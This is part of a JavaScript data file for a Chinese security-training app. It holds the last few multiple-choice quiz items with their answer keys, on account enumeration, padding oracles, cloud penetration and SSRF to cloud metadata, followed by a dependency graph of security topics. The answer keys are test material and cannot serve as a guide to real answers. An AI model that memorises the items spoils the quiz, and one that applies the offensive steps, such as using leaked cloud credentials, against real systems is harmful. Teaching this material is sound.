  { id:"cs2", cat:"crypto", level:"高级", q:"登录失败信息不统一（区分账号是否存在）会带来？", options:["账号枚举风险，攻击者可先确认有效账号再针对性攻击","提升用户体验","减少日志量","加快登录速度"], answer:0, explain:"统一错误提示是低成本高收益的防护动作。" },
  { id:"cs3", cat:"crypto", level:"高级", q:"padding oracle 类攻击的成立条件是？", options:["解密失败与填充错误返回了可区分的响应","网络延迟过高","密钥长度不足","使用了哈希"], answer:0, explain:"统一解密失败响应、并优先使用 AEAD 模式可消除该类攻击面。" },
  { id:"pc1", cat:"pentest", level:"高级", q:"云环境渗透最常见的突破口是？", options:["暴露在公网的服务与存储，以及泄露的访问密钥","操作系统内核漏洞","物理机房进入","无线信号干扰"], answer:0, explain:"云上问题以「配置与身份」为主，而非传统主机漏洞。" },
  { id:"pc2", cat:"pentest", level:"高级", q:"拿到云上临时凭证后的第一步应是？", options:["枚举「我是谁、能做什么」，搞清权限边界","立即删除资源","对外公开凭证","先扫描全内网"], answer:0, explain:"权限枚举决定后续可行路径，也能避免越界操作。" },
  { id:"pc3", cat:"pentest", level:"中级", q:"SSRF 打云元数据之所以高价值，是因为？", options:["可获取实例临时凭证，进而访问云资源","能让实例重启","可修改 DNS","可提升带宽"], answer:0, explain:"云上 SSRF 常直接升级为凭证窃取与资源控制，应强制 IMDSv2 缓解。" },
  ]
};

/* ============================================================
   v1.1.0 知识图谱（AGENT-DESIGN 第 2 节第 3 条）：74 个知识点上的
   「前置 / 并列 / 进阶」依赖边，用于「学 A 前先补 B」的诊断与计划。
   - prereq:   学 key 之前建议先补 to 数组中的知识点
   - advanced: 学完 key 之后可深入 to 数组中的知识点
   - peer:     key 与 to 并列（同类可替代 / 组合学习）
   仅登记知识体系内的 id；未知 id 由 app.js 建索引时过滤。
   ============================================================ */
SEC_DATA.knowledge_graph = {
  prereq: {
    // —— web ——
    sqli: ["net-proto"], xss: ["net-proto", "auth"], csrf: ["auth", "xss"],
    ssrf: ["net-proto", "lfi"], upload: ["lfi"], cmdinj: ["net-proto"],
    deser: ["cmdinj"], auth: ["sym", "hash"], xxe: ["lfi", "ssrf"],
    jwt: ["auth", "asym"], clickjack: ["auth"], cors: ["net-proto"],
    lfi: ["net-proto"], ssti: ["cmdinj"], idor: ["auth"],
    "api-sec": ["auth", "jwt"], smuggling: ["net-proto"], "proto-poll": ["deser"],
    graphql: ["api-sec", "idor"], "cache-poison": ["smuggling", "net-proto"],
    // —— binary ——
    heap: ["stack"], fmt: ["stack"], rop: ["stack", "mitigations"],
    sandbox: ["rop", "mitigations"], mitigations: ["stack"], uaf: ["heap"],
    "av-bypass": ["sandbox"],
    // —— crypto ——
    asym: ["sym"], hash: ["sym"], rand: ["sym"], ecc: ["asym"],
    tls: ["asym", "sym", "blockmode"], pqc: ["asym", "ecc"],
    blockmode: ["sym"], pki: ["asym", "hash"], "crypto-misuse": ["rand", "hash"],
    "side-channel": ["sym", "asym"],
    // —— pentest ——
    recon: ["net-proto"], scan: ["recon", "port-scan"], privesc: ["scan"],
    lateral: ["privesc"], report: ["scan"], oauth: ["auth", "jwt"],
    cloud: ["iam"], ad: ["lateral"], osint: ["recon"], "priv-esc": ["scan"],
    // —— network ——
    "port-scan": ["net-proto"], "arp-dns": ["net-proto"],
    "net-lateral": ["arp-dns"], "ad-pentest": ["net-lateral"], "fw-bypass": ["port-scan", "ids"],
    // —— cloud ——
    iam: ["shared-resp"], "container-escape": ["sandbox", "iam"],
    k8s: ["container-escape", "iam"], serverless: ["iam", "metadata"], metadata: ["iam", "ssrf"],
    // —— blue ——
    ids: ["net-proto", "siem"], traffic: ["ids", "siem"],
    ir: ["siem", "edr"], "threat-intel": ["traffic"], edr: ["siem"],
  },
  advanced: {
    stack: ["rop", "heap", "fmt"], heap: ["uaf"], mitigations: ["rop", "sandbox"],
    sym: ["blockmode", "tls"], asym: ["tls", "pki", "ecc"], hash: ["pki"],
    rand: ["crypto-misuse"], blockmode: ["tls"], auth: ["jwt", "oauth"],
    lfi: ["xxe"], sqli: ["deser"], recon: ["scan", "osint"],
    scan: ["privesc"], privesc: ["lateral"], lateral: ["ad"],
    "net-proto": ["arp-dns", "port-scan"], "port-scan": ["fw-bypass"],
    "arp-dns": ["net-lateral"], "net-lateral": ["ad-pentest"],
    "shared-resp": ["iam"], iam: ["metadata", "k8s"], "container-escape": ["k8s"],
    siem: ["ids", "edr"], ids: ["traffic"], traffic: ["threat-intel"], ir: ["threat-intel"],
  },
  peer: {
    sqli: ["xss", "cmdinj"], xss: ["csrf", "sqli"], csrf: ["cors", "clickjack"],
    cmdinj: ["ssti", "deser"], ssti: ["xxe", "deser"], xxe: ["ssti", "ssrf"],
    cors: ["csrf"], idor: ["api-sec"], "proto-poll": ["deser"],
    // 同义/重复主题互连：可互为替代
    intovf: ["int-overflow"], "int-overflow": ["intovf"],
    race: ["toctou"], toctou: ["race"], fuzz: ["fuzzing"], fuzzing: ["fuzz"],
    privesc: ["priv-esc"], "priv-esc": ["privesc"],
    ad: ["ad-pentest"], "ad-pentest": ["ad"], lateral: ["net-lateral"], "net-lateral": ["lateral"],
    heap: ["fmt"], fmt: ["heap"], uaf: ["race"],
    sym: ["asym"], asym: ["sym"], hash: ["rand"], rand: ["hash"],
    "crypto-misuse": ["side-channel"], "side-channel": ["crypto-misuse"],
    recon: ["port-scan", "osint"], osint: ["social"], social: ["osint"],
    "threat-intel": ["osint"], metadata: ["ssrf"], ssrf: ["metadata"],
    ids: ["edr", "fw-bypass"], edr: ["ids"],
    // 移动安全：客户端逆向 / 组件 / 通信 / 数据 四条线互相印证
    "mobile-attack-surface": ["apk-sign", "local-storage"], "apk-sign": ["mobile-attack-surface", "app-hardening"],
    "component-export": ["webview", "mobile-api"], webview: ["component-export", "ssl-pinning"],
    "local-storage": ["mobile-attack-surface", "root-detect"], "ssl-pinning": ["mobile-api", "dynamic-debug"],
    "dynamic-debug": ["root-detect", "ssl-pinning"], "root-detect": ["dynamic-debug", "jailbreak-detect"],
    "app-hardening": ["apk-sign", "mobile-malware"], "ios-basics": ["jailbreak-detect", "ssl-pinning"],
    "jailbreak-detect": ["ios-basics", "root-detect"], "mobile-api": ["component-export", "ssl-pinning"],
    "mobile-malware": ["app-hardening", "local-storage"],
    // 数据安全：分级 → 脱敏/加密/权限 → 审计 → 合规/出境/泄露/备份
    "ds-lifecycle": ["ds-classify", "ds-privacy-law"], "ds-classify": ["ds-lifecycle", "ds-mask"],
    "ds-dlp": ["ds-audit", "ds-mask"], "ds-mask": ["ds-classify", "ds-privacy-law"],
    "ds-encrypt": ["ds-access", "ds-backup"], "ds-access": ["ds-encrypt", "ds-audit"],
    "ds-audit": ["ds-insider", "ds-leak-response"], "ds-privacy-law": ["ds-minimize", "ds-cross-border"],
    "ds-minimize": ["ds-privacy-law", "ds-mask"], "ds-cross-border": ["ds-privacy-law", "ds-leak-response"],
    "ds-leak-response": ["ds-audit", "ds-backup"], "ds-insider": ["ds-access", "ds-audit"],
    "ds-backup": ["ds-encrypt", "ds-leak-response"],
    // 供应链：全景 → SBOM/依赖/SCA → 投毒/构建/签名 → CICD/密钥/供应商 → 案例/响应
    "sc-concept": ["sc-sbom", "sc-attack"], "sc-sbom": ["sc-dependency", "sc-sca"],
    "sc-dependency": ["sc-sca", "sc-sbom"], "sc-sca": ["sc-dependency", "sc-sbom"],
    "sc-typosquat": ["sc-dependency", "sc-secrets"], "sc-build": ["sc-signing", "sc-cicd"],
    "sc-signing": ["sc-build", "sc-cicd"], "sc-cicd": ["sc-secrets", "sc-build"],
    "sc-secrets": ["sc-cicd", "sc-typosquat"], "sc-thirdparty": ["sc-dependency", "sc-vendor"],
    "sc-vendor": ["sc-thirdparty", "sc-response"], "sc-attack": ["sc-concept", "sc-response"],
    "sc-response": ["sc-attack", "sc-sbom"],
    // AI·LLM：输入 → 数据 → 动作 → 输出 → 供应链 → 治理
    "aisec-landscape": ["aisec-prompt-injection", "aisec-defense"], "aisec-prompt-injection": ["aisec-jailbreak", "aisec-rag-risks"],
    "aisec-jailbreak": ["aisec-prompt-injection", "aisec-defense"], "aisec-data-leak": ["aisec-rag-risks", "aisec-privacy"],
    "aisec-rag-risks": ["aisec-data-leak", "aisec-prompt-injection"], "aisec-agent-tools": ["aisec-defense", "aisec-output-handling"],
    "aisec-output-handling": ["aisec-agent-tools", "aisec-defense"], "aisec-model-supply": ["aisec-privacy", "aisec-governance"],
    "aisec-privacy": ["aisec-model-supply", "aisec-governance"], "aisec-defense": ["aisec-eval", "aisec-agent-tools"],
    "aisec-eval": ["aisec-defense", "aisec-governance"], "aisec-cost-dos": ["aisec-agent-tools", "aisec-defense"],
    "aisec-governance": ["aisec-eval", "aisec-privacy"],
    // SOC/CTI：情报 → 检测 → 研判 → 狩猎/应急/取证 → 度量与归因
    "soc-basics": ["soc-ioc-ioa", "soc-platform"], "soc-ioc-ioa": ["soc-detection", "soc-mitre"],
    "soc-soc-ops": ["soc-triage", "soc-metrics"], "soc-detection": ["soc-triage", "soc-hunting"],
    "soc-triage": ["soc-detection", "soc-ir-flow"], "soc-hunting": ["soc-detection", "soc-mitre"],
    "soc-ir-flow": ["soc-forensics", "soc-triage"], "soc-forensics": ["soc-ir-flow", "soc-baseline"],
    "soc-mitre": ["soc-detection", "soc-hunting"], "soc-platform": ["soc-basics", "soc-metrics"],
    "soc-metrics": ["soc-soc-ops", "soc-detection"], "soc-attribution": ["soc-platform", "soc-hunting"],
    "soc-baseline": ["soc-detection", "soc-forensics"],
  }
};
